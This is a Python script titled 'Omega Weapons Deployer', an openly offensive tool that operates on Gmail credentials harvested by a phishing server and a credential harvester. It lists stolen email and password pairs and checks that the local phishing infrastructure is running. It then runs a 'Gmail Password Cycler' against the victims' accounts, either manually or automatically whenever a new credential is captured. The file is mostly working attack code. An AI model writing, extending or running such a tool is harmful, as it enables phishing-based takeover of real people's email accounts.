"""
☠️ OMEGA WEAPONS DEPLOYER ☠️
============================
One-click deployment of the Gmail Password Cycler
using credentials captured from the OAuth Phishing Server
or Credential Harvester.

USAGE:
    python weapons_deployer.py                    # Interactive mode
    python weapons_deployer.py --auto             # Auto-deploy on first captured cred
    python weapons_deployer.py --email X --pw Y   # Manual mode
    python weapons_deployer.py --list             # List captured credentials
"""

import os, sys, json, re, time
from datetime import datetime

OMEGA_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURED_CREDS = os.path.join(OMEGA_DIR, 'phishing', 'captured_creds.txt')
OAUTH_TOKENS = os.path.join(OMEGA_DIR, 'phishing')
WEAPONS_DIR = os.path.join(OMEGA_DIR, 'weapons')
USAGE_LOG = os.path.join(WEAPONS_DIR, 'weapon_usage.log')


def banner():
    print(r"""
    ╔═══════════════════════════════════════════════════╗
    ║     ☠️  OMEGA WEAPONS DEPLOYER  ☠️                ║
    ║     Gmail Password Cycler - Deployment Console    ║
    ╚═══════════════════════════════════════════════════╝
    """)


def list_captured_creds():
    """List all captured credentials."""
    if not os.path.exists(CAPTURED_CREDS):
        print("[!] No captured credentials found.")
        return []
    
    with open(CAPTURED_CREDS, 'r') as f:
        lines = f.readlines()
    
    if not lines:
        print("[!] Credential file is empty.")
        return []
    
    print(f"\n{'='*60}")
    print(f"📋 CAPTURED CREDENTIALS ({len(lines)} total)")
    print(f"{'='*60}")
    
    creds = []
    for i, line in enumerate(lines):
        line = line.strip()
        match = re.search(r'Email:\s*(\S+)\s*\|\s*Password:\s*(\S+)', line)
        if match:
            email, pw = match.group(1), match.group(2)
            creds.append((email, pw))
            timestamp = re.search(r'\[([^\]]+)\]', line)
            ts = timestamp.group(1) if timestamp else 'unknown'
            print(f"  [{i+1}] {ts} | {email} | pw={pw[:15]}...")
        else:
            print(f"  [{i+1}] {line[:80]}")
    
    return creds


def check_running_servers():
    """Check if our attack infrastructure is running."""
    import requests
    servers = {
        'OAuth Phishing (port 5000)': 'http://localhost:5000',
        'Cred Harvester (port 8080)': 'http://localhost:8080',
    }
    
    print(f"\n{'='*60}")
    print("🔍 INFRASTRUCTURE STATUS")
    print(f"{'='*60}")
    
    all_running = True
    for name, url in servers.items():
        try:
            r = requests.get(url, timeout=3)
            print(f"  ✅ {name} — RUNNING (HTTP {r.status_code})")
        except:
            print(f"  ❌ {name} — DOWN")
            all_running = False
    
    return all_running


def deploy_cycler(email, current_pw, old_pw=None, headless=True):
    """Deploy the Gmail Password Cycler."""
    print(f"\n{'='*60}")
    print(f"🚀 DEPLOYING GMAIL PASSWORD CYCLER")
    print(f"{'='*60}")
    print(f"  Target:    {email}")
    print(f"  Current:   {current_pw[:3]}***{current_pw[-3:]}")
    if old_pw:
        print(f"  Restore:   {old_pw[:3]}***{old_pw[-3:]}")
    print(f"{'='*60}\n")
    
    # Import and run the cycler
    sys.path.insert(0, OMEGA_DIR)
    from gmail_password_cycler import GmailPasswordCycler
    
    cycler = GmailPasswordCycler(
        email=email,
        current_password=current_pw,
        old_password=old_pw or current_pw,
        headless=headless,
        slow_factor=2  # More reliable
    )
    
    return cycler.cycle_passwords()


def watch_and_deploy():
    """Watch for new captured credentials and auto-deploy."""
    import hashlib
    
    print("[*] Watching for new captured credentials...")
    print("[*] Press Ctrl+C to stop\n")
    
    last_hash = None
    if os.path.exists(CAPTURED_CREDS):
        with open(CAPTURED_CREDS, 'rb') as f:
            last_hash = hashlib.md5(f.read()).hexdigest()
    
    try:
        while True:
            if os.path.exists(CAPTURED_CREDS):
                with open(CAPTURED_CREDS, 'rb') as f:
                    current_hash = hashlib.md5(f.read()).hexdigest()
                
                if current_hash != last_hash:
                    print(f"\n[!] New credential detected! ({datetime.now().isoformat()})")
                    creds = list_captured_creds()
                    if creds:
                        email, pw = creds[-1]
                        print(f"\n[!] Captured: {email} / {pw[:10]}...")
                        
                        old_pw = input("[?] Enter old password to restore to (or Enter to skip): ")
                        if old_pw.strip():
                            deploy_cycler(email, pw, old_pw.strip())
                        else:
                            print("[*] Skipping cycler deployment.")
                    
                    last_hash = current_hash
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Watcher stopped.")


def main():
    banner()
    
    if len(sys.argv) > 1:
        cmd = sys.argv[1]
        
        if cmd == '--list' or cmd == 'list':
            list_captured_creds()
            return
        
        elif cmd == '--auto' or cmd == 'auto':
            check_running_servers()
            watch_and_deploy()
            return
        
        elif cmd == '--email' and len(sys.argv) >= 4:
            email = sys.argv[2]
            pw = sys.argv[3]
            old_pw = sys.argv[4] if len(sys.argv) > 4 else None
            deploy_cycler(email, pw, old_pw)
            return
    
    # Interactive mode
    creds = list_captured_creds()
    check_running_servers()
    
    print(f"\n{'='*60}")
    print("⚡ OPTIONS")
    print(f"{'='*60}")
    print("  1. Deploy cycler with a captured credential")
    print("  2. Deploy cycler manually (enter email/password)")
    print("  3. Watch mode — auto-deploy on new captures")
    print("  4. Check weapon status")
    print("  5. Exit")
    
    choice = input("\n[?] Select option (1-5): ").strip()
    
    if choice == '1':
        if not creds:
            print("[!] No captured credentials available.")
            return
        print("\nSelect credential:")
        for i, (email, pw) in enumerate(creds):
            print(f"  [{i+1}] {email}")
        sel = int(input("[?] Select: ").strip()) - 1
        if 0 <= sel < len(creds):
            email, pw = creds[sel]
            old_pw = input("[?] Enter old password to restore to (Enter to skip): ").strip()
            deploy_cycler(email, pw, old_pw if old_pw else None)
    
    elif choice == '2':
        email = input("[?] Target email: ").strip()
        pw = input("[?] Current password: ").strip()
        old_pw = input("[?] Old password to restore to: ").strip()
        deploy_cycler(email, pw, old_pw if old_pw else None)
    
    elif choice == '3':
        watch_and_deploy()
    
    elif choice == '4':
        print(f"\n{'='*60}")
        print("🔫 WEAPONS STATUS")
        print(f"{'='*60}")
        vbs_path = os.path.join(WEAPONS_DIR, 'gmail_password_cycler.vbs')
        py_path = os.path.join(OMEGA_DIR, 'gmail_password_cycler.py')
        
        for name, path in [("VBS Cycler", vbs_path), ("Python Cycler", py_path), 
                          ("Deployer", __file__)]:
            if os.path.exists(path):
                size = os.path.getsize(path)
                print(f"  ✅ {name} — READY ({size/1024:.1f} KB)")
            else:
                print(f"  ❌ {name} — MISSING")
        
        if os.path.exists(USAGE_LOG):
            with open(USAGE_LOG) as f:
                logs = f.readlines()
            print(f"\n  📊 Deployment history: {len(logs)} uses")
            for log in logs[-5:]:
                print(f"     {log.strip()}")
        
        servers = [
            ("OAuth Phishing", 5000),
            ("Cred Harvester", 8080),
        ]
        import socket
        for name, port in servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            status = "RUNNING" if result == 0 else "DOWN"
            print(f"  {'✅' if result == 0 else '❌'} {name} — {status}")
            sock.close()
    
    elif choice == '5':
        print("[*] Exiting.")
        return


if __name__ == "__main__":
    main()
